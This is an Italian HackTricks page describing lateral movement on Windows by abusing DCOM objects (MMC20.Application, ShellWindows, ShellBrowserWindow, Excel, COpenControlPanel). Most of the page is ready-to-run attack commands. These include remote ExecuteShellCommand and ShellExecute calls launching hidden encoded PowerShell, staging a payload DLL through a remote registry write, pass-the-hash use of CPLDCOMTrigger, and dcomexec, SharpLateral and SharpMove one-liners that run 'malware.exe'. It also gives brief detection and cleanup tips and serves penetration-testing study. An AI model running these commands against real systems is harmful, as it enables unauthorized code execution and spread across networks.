# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

Il lateral movement tramite DCOM è interessante perché riutilizza server COM esistenti esposti tramite RPC/DCOM, invece di creare un servizio o un'attività pianificata. In pratica, ciò significa che la connessione iniziale di solito inizia sulla porta TCP/135 e poi passa a porte RPC alte assegnate dinamicamente.

## Prerequisiti e insidie

- Di solito è necessario disporre di un contesto di amministratore locale sul target e il server COM remoto deve consentire l'avvio/l'attivazione da remoto.
- Dal **14 marzo 2023**, Microsoft applica il rafforzamento DCOM sui sistemi supportati. I client meno recenti che richiedono un livello di autenticazione di attivazione basso possono non funzionare, a meno che non negozino almeno `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. I client Windows moderni di solito aumentano automaticamente il livello, quindi gli strumenti attuali normalmente continuano a funzionare.<sup>[[3]](#references)</sup>
- L'esecuzione DCOM manuale o tramite script richiede in genere TCP/135 e l'intervallo di porte RPC dinamiche del target. Se usi `dcomexec.py` di Impacket e vuoi ricevere l'output dei comandi, di solito serve anche l'accesso SMB a `ADMIN$` (o a un'altra share con permessi di lettura/scrittura).
- Se RPC/DCOM funziona ma SMB è bloccato, `dcomexec.py -nooutput` può comunque essere utile per l'esecuzione blind.

Controlli rapidi:

```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```

## MMC20.Application

Per ulteriori informazioni su questa tecnica, consulta il [post originale su MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/).<sup>[[1]](#references)</sup>

Gli oggetti Distributed Component Object Model (DCOM) offrono interessanti possibilità di interazione con gli oggetti tramite rete. Microsoft fornisce una documentazione completa sia per DCOM sia per Component Object Model (COM), accessibile [qui per DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) e [qui per COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). È possibile recuperare un elenco delle applicazioni DCOM con il comando PowerShell:

```bash
Get-CimInstance Win32_DCOMApplication
```

L'oggetto COM [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) consente di eseguire script per le operazioni degli snap-in MMC. In particolare, questo oggetto include un metodo `ExecuteShellCommand` in `Document.ActiveView`. Puoi trovare maggiori informazioni su questo metodo [qui](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Verificalo in esecuzione:<sup>[[6]](#references)</sup>

Questa funzionalità consente di eseguire comandi in rete tramite un'applicazione DCOM. Per interagire da remoto con DCOM come amministratore, puoi usare PowerShell nel modo seguente:

```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```

Questo comando si connette all'applicazione DCOM e restituisce un'istanza dell'oggetto COM. È quindi possibile invocare il metodo ExecuteShellCommand per eseguire un processo sull'host remoto. Il processo prevede i seguenti passaggi:

Verifica i metodi:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```

Ottenere RCE:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
    "cmd.exe",
    $null,
    "/c powershell -NoP -W Hidden -Enc <B64>",
    "7"
)
```

L'ultimo argomento è lo stile della finestra. `7` mantiene la finestra ridotta a icona. In pratica, l'esecuzione basata su MMC porta comunemente alla creazione di un processo remoto `mmc.exe` che avvia il payload, a differenza degli oggetti basati su Explorer descritti di seguito.

## ShellWindows & ShellBrowserWindow

**Per ulteriori informazioni su questa tecnica, consulta il post originale [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

È stato osservato che l'oggetto **MMC20.Application** non aveva un valore `LaunchPermission` specifico dell'applicazione.<sup>[[2]](#references)</sup> Ciò non concede di per sé l'accesso: COM verifica l'ACL `DefaultLaunchPermission` del computer e, ove applicabili, le restrizioni di avvio/accesso a livello di computer.<sup>[[9]](#references)[[10]](#references)</sup> Per ulteriori dettagli, è possibile consultare una discussione [qui](https://twitter.com/tiraniddo/status/817532039771525120); si consiglia inoltre di usare OleView .NET di [@tiraniddo](https://twitter.com/tiraniddo) per filtrare gli oggetti senza un'autorizzazione di avvio esplicita.

Due oggetti specifici, `ShellBrowserWindow` e `ShellWindows`, sono stati evidenziati perché privi di autorizzazioni di avvio esplicite.<sup>[[2]](#references)</sup> L'assenza di un valore `LaunchPermission` in `HKCR:\AppID\{guid}` significa che non è presente un'ACL di avvio specifica dell'applicazione; **non** significa che l'attivazione remota sia senza restrizioni.<sup>[[9]](#references)[[10]](#references)</sup>

Rispetto a `MMC20.Application`, questi oggetti sono spesso più discreti dal punto di vista dell'OPSEC, perché il comando finisce comunemente per essere un processo figlio di `explorer.exe` sull'host remoto anziché di `mmc.exe`.

### ShellWindows

Per `ShellWindows`, che non dispone di un ProgID, i metodi .NET `Type.GetTypeFromCLSID` e `Activator.CreateInstance` consentono di istanziare l'oggetto usando il suo CLSID. Questo processo utilizza OleView .NET per recuperare il CLSID di `ShellWindows`. Una volta istanziato, è possibile interagire con l'oggetto tramite il metodo `WindowsShell.Item`, arrivando a invocare metodi come `Document.Application.ShellExecute`.<sup>[[2]](#references)</sup>

Sono stati forniti comandi PowerShell di esempio per istanziare l'oggetto ed eseguire comandi da remoto:

```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```

### ShellBrowserWindow

`ShellBrowserWindow` è simile, ma puoi crearne un'istanza direttamente tramite il suo CLSID e fare pivot su `Document.Application.ShellExecute`:

```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
    "cmd.exe",
    "/c whoami > C:\\Windows\\Temp\\dcom.txt",
    "C:\\Windows\\System32",
    $null,
    0
)
```

### Movimento laterale con oggetti DCOM di Excel

È possibile ottenere movimento laterale sfruttando gli oggetti DCOM di Excel. Per informazioni dettagliate, è consigliabile leggere la discussione sull'utilizzo di Excel DDE per il movimento laterale tramite DCOM sul [blog di Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>

Il progetto Empire fornisce uno script PowerShell che illustra come utilizzare Excel per l'esecuzione di codice remoto (RCE) manipolando gli oggetti DCOM. Di seguito sono riportati alcuni frammenti dello script disponibile nel [repository GitHub di Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), che mostrano diversi metodi per sfruttare Excel per l'RCE:

```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $isx64 = [boolean]$obj.Application.ProductCode[21]
    Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $Obj.DisplayAlerts = $false
    $Obj.DDEInitiate("cmd", "/c $Command")
}
```

Ricerche recenti hanno ampliato questo ambito con il metodo `ActivateMicrosoftApp()` di `Excel.Application`. L'idea chiave è che Excel può tentare di avviare applicazioni Microsoft legacy come FoxPro, Schedule Plus o Project cercandole nel `PATH` del sistema. Se un operatore può inserire un payload con uno dei nomi previsti in una posizione scrivibile inclusa nel `PATH` del target, Excel lo eseguirà.<sup>[[4]](#references)</sup>

Requisiti per questa variante:

- Amministratore locale sul target
- Excel installato sul target
- Possibilità di scrivere un payload in una directory scrivibile del `PATH` del target

Esempio pratico che sfrutta la ricerca di FoxPro (`FOXPROW.exe`):

```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```

Se l'host attaccante non ha registrato il ProgID locale `Excel.Application`, istanzia invece l'oggetto remoto tramite CLSID:

```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```

Valori osservati sfruttati in pratica:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — caricamento di una DLL Control Panel registrata

La classe `COpenControlPanel` (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) espone `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`). Il suo metodo `Open()` fa sì che le DLL Control Panel registrate nella chiave `Control Panel\Cpls` vengano caricate da un `dllhost.exe` remoto. La classe non ha autorizzazioni esplicite di avvio/accesso nei sistemi testati, quindi eredita i criteri DCOM predefiniti (che normalmente richiedono un amministratore per l’attivazione remota). Per fare in modo che `Open()` elabori le DLL registrate basta un nome di elemento casuale; il payload non deve avere estensione `.cpl`, ma deve essere una DLL valida dell’architettura corretta.<sup>[[7]](#references)</sup>

Questa primitiva è **stage-and-trigger**, non un’esecuzione basata solo su comandi: prima copia una DLL sul target e crea un valore `REG_EXPAND_SZ` che la indica, quindi attiva l’oggetto tramite DCOM. Per esempio, da un contesto Windows amministrativo:<sup>[[7]](#references)</sup>

```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```

Il client pubblico [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) implementa la chiamata DCOM non documentata con Impacket. È sufficiente fornire un nome arbitrario di un elemento del Pannello di controllo; il client può segnalare un errore RPC anche se `dllhost.exe` ha caricato la DLL.<sup>[[8]](#references)</sup>

```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```

Operativamente, questo percorso richiede anche un canale di scrittura su file e l'accesso al registro remoto, quindi è più rumoroso di `MMC20`/`ShellWindows`. Crea un effetto collaterale di persistenza, perché aprire il Pannello di controllo in seguito può caricare di nuovo la stessa voce. Rimuovi il valore dopo l'esecuzione e cerca valori inattesi in `Control Panel\Cpls` insieme a caricamenti insoliti di DLL in `dllhost.exe`.<sup>[[7]](#references)</sup>

```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```

### Strumenti di automazione per il movimento laterale

Sono evidenziati due strumenti per automatizzare queste tecniche:

- **Invoke-DCOM.ps1**: uno script PowerShell fornito dal progetto Empire che semplifica l'esecuzione di diversi metodi per eseguire codice su macchine remote. Lo script è disponibile nel repository GitHub di Empire.

- **SharpLateral**: uno strumento progettato per eseguire codice in remoto, utilizzabile con il comando:

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- [SharpMove](https://github.com/0xthirteen/SharpMove):

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```

## Strumenti automatici

- Lo script Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) consente di invocare facilmente tutti i metodi illustrati per eseguire codice su altre macchine.
- Puoi usare `dcomexec.py` di Impacket per eseguire comandi su sistemi remoti tramite DCOM. Le build attuali supportano `ShellWindows`, `ShellBrowserWindow` e `MMC20` e usano `ShellWindows` come impostazione predefinita.

```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```

- Potresti anche usare [**SharpLateral**](https://github.com/mertdas/SharpLateral):

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- Potresti anche usare [**SharpMove**](https://github.com/0xthirteen/SharpMove)

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```





## References

- [1] [Movimento laterale usando l'oggetto COM MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Movimento laterale tramite DCOM: Round 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Gestire le modifiche per la vulnerabilità di bypass della funzionalità di sicurezza di Windows DCOM Server (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Movimento laterale: sfruttare la potenza dell'applicazione Excel DCOM](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Sfruttare Excel DDE per il movimento laterale tramite DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - Classe dell'applicazione MMC (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [Usare oggetti DCOM per l'esecuzione remota di comandi](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
- [9] [DefaultLaunchPermission - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/com/defaultlaunchpermission)
- [10] [MS-DCOM: Appendice B, comportamento del prodotto - Microsoft Learn](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/acc42954-4073-4f05-b850-efd562022077)
{{#include ../../banners/hacktricks-training.md}}
